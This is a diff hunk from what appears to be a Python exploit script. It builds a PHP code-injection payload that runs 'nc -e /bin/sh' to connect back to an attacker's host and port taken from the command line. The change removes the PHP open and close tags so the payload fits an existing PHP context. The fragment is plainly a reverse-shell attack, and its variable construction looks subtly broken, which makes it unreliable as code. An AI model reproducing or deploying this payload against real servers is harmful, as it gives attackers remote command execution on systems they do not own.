@@ -18,7 +18,7 @@ try:
 
 	LHOST = 'LHOST=' + str(sys.argv[1])
 	LPORT = 'LPORT=' + str(sys.argv[2])
-	PAYLOAD = '<?php exec("nc -e /bin/sh ' + LHOST + ' ' + LPORT + '"); ?>'
+	PAYLOAD = 'exec("nc -e /bin/sh ' + LHOST + ' ' + LPORT + '");'
 
 except IndexError:
 
